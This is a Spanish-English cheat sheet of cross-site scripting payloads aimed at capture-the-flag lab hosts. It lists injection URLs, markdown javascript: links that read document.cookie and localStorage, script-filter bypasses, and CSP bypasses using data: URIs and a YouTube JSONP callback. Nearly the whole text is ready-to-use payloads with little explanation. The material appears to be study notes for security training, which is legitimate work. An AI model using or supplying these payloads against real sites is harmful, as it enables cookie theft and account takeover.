Inyeccion basica en variables:
```js
https://azhfvzyf.eu1.ctfio.com/context-js-variable/?name=test123%27;alert(1);//
```


### XSS MARKDOWN BASICS

```
https://azhfvzyf.eu1.ctfio.com/markdown/?name=%5Ba%5D%28javascript%3Aconfirm%60hidalg0d%60%29
```


```
<!-- markdow link to XSS, this usually always work but it requires interaction -->
[a](javascript:prompt(document.cookie))

<!-- Other links attacks with some bypasses -->
[Basic](javascript:alert('Basic'))
[Local Storage](javascript:alert(JSON.stringify(localStorage)))
[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
[URL](javascript://www.google.com%0Aalert('URL'))
[In Quotes]('javascript:alert("InQuotes")')
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```


```
More advanced

![thisisatext](https://app.hackinghub.io/images/logo_min.png1"onerror=alert(1);//)

```



### FILTER BYPASS

```
https://sgtr6zi0.eu1.ctfio.com/filter-script-case/?comment=%3CScriPt%3Ealert%281%29%3C%2Fscript%3E


https://sgtr6zi0.eu1.ctfio.com/filter-script-2nd/?comment=%3Cscript%3Ealert%28%29%3C%2Fscript%3E%3Cscript%3Ealert%28%29%3C%2Fscript%3E

https://sgtr6zi0.eu1.ctfio.com/filter-script/?comment=%3Cimg%2Fsrc%3Dx+onerror%3Dalert%281%29%3E


https://sgtr6zi0.eu1.ctfio.com/filter-on-attr/?comment=%3Ca%2Fhref%3Djavascript%3Aalert%281%29%3Eclick

https://sgtr6zi0.eu1.ctfio.com/filter-tags/?comment=%3Csc%3Cscript%3Eript%3Ealert%281%29%3C%2Fsc%3C%2Fscript%3Eript%3E
```



### CSP BYPASS

**DATA**

```
|||
|---|---|
|content-length|631|

|   |   |
|---|---|
|content-security-policy|script-src 'self' [https://app.hackinghub.io](https://app.hackinghub.io "https://app.hackinghub.io") data:|
|content-type|text/html; charset=UTF-8|
|date|Sat, 26 Oct 2024 09:33:00 GMT|
|server|nginx/1.22.0 (Ubuntu)|
|X-Firefox-Spdy|h2|
```


```
<script src=data:text/javascript,alert(1337)></script>
```


CSP-JSON

```
|   |   |
|---|---|
|content-security-policy|script-src 'self' [https://app.hackinghub.io](https://app.hackinghub.io "https://app.hackinghub.io") [https://www.google.com](https://www.google.com "https://www.google.com") [https://www.youtube.com](https://www.youtube.com "https://www.youtube.com")|
```

```
<script src=https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=pFdfhg2IP_0&callback=alert(1)></script>
```


